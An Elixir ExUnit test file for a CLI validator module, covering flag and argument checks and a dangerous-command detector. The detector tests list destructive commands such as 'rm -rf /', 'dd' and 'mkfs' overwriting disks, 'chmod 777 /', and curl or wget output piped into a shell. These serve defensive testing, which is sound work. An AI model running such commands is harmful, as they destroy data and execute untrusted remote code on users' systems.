defmodule Alaja.CLI.ValidatorTest do
  use ExUnit.Case, async: true

  alias Alaja.CLI.Validator

  describe "validate_flags/2" do
    test "returns :ok when no flags are present" do
      assert Validator.validate_flags([], []) == :ok
    end

    test "returns :ok when all flags are valid" do
      flags = [%{name: :verbose, type: :boolean, required: false, default: false, values: nil}]
      assert Validator.validate_flags(flags, verbose: true) == :ok
    end

    test "returns error when required flag is missing" do
      flags = [%{name: :name, type: :string, required: true, default: nil, values: nil}]
      assert {:error, errors} = Validator.validate_flags(flags, [])
      assert errors == ["--name is required"]
    end

    test "required flag uses default when value present" do
      flags = [%{name: :name, type: :string, required: true, default: "default", values: nil}]
      assert Validator.validate_flags(flags, name: "x") == :ok
    end

    test "returns error when value not in allowed set" do
      flags = [
        %{name: :color, type: :string, required: false, default: nil, values: ["red", "green"]}
      ]

      assert {:error, [msg]} = Validator.validate_flags(flags, color: "blue")
      assert msg =~ "is not valid"
      assert msg =~ "red"
      assert msg =~ "green"
    end

    test "integer type validates" do
      flags = [%{name: :count, type: :integer, required: false, default: 0, values: nil}]
      assert Validator.validate_flags(flags, count: 42) == :ok
      assert Validator.validate_flags(flags, count: "42") == :ok
      assert {:error, [msg]} = Validator.validate_flags(flags, count: "abc")
      assert msg =~ "expected integer"
    end

    test "float type validates" do
      flags = [%{name: :ratio, type: :float, required: false, default: 0.0, values: nil}]
      assert Validator.validate_flags(flags, ratio: 1.5) == :ok
      assert Validator.validate_flags(flags, ratio: "1.5") == :ok
      assert {:error, [msg]} = Validator.validate_flags(flags, ratio: "xyz")
      assert msg =~ "expected float"
    end

    test "integer accepts negative" do
      flags = [%{name: :n, type: :integer, required: false, default: 0, values: nil}]
      assert Validator.validate_flags(flags, n: -5) == :ok
    end

    test "non-integer/float type is no-op" do
      flags = [%{name: :name, type: :string, required: false, default: nil, values: nil}]
      assert Validator.validate_flags(flags, name: "anything") == :ok
    end
  end

  describe "validate_args/2" do
    test "returns :ok when all required args are present" do
      args = [%{name: "name", required: true}, %{name: "extra", required: false}]
      assert Validator.validate_args(args, ["foo"]) == :ok
    end

    test "returns :ok when no args required and none given" do
      assert Validator.validate_args([], []) == :ok
    end

    test "returns error when required args are missing" do
      args = [%{name: "name", required: true}]
      assert {:error, [msg]} = Validator.validate_args(args, [])
      assert msg =~ "Missing required argument: name"
    end

    test "error lists ALL missing required args in order" do
      args = [
        %{name: "first", required: true},
        %{name: "second", required: true},
        %{name: "third", required: true}
      ]

      assert {:error, msgs} = Validator.validate_args(args, [])
      assert length(msgs) == 3
      assert Enum.at(msgs, 0) =~ "first"
      assert Enum.at(msgs, 1) =~ "second"
      assert Enum.at(msgs, 2) =~ "third"
    end
  end

  describe "dangerous?/1" do
    test "detects rm -rf /" do
      assert Validator.dangerous?("rm -rf /etc")
      assert Validator.dangerous?("rm -rf /")
    end

    test "detects sudo rm" do
      assert Validator.dangerous?("sudo rm file")
    end

    test "detects dd if=" do
      assert Validator.dangerous?("dd if=/dev/zero of=/dev/sda")
    end

    test "detects mkfs" do
      assert Validator.dangerous?("mkfs.ext4 /dev/sda1")
    end

    test "detects redirect to /dev/sda" do
      assert Validator.dangerous?("echo x>/dev/sda")
    end

    test "detects chmod 777" do
      assert Validator.dangerous?("chmod 777 /")
    end

    test "detects pipe to shell" do
      assert Validator.dangerous?("wget http://x.com/script.sh | sh")
      assert Validator.dangerous?("curl http://x.com | bash")
    end

    test "returns false for safe commands" do
      refute Validator.dangerous?("ls -la")
      refute Validator.dangerous?("echo hello")
      refute Validator.dangerous?("git status")
      refute Validator.dangerous?("cat file.txt")
    end
  end
end
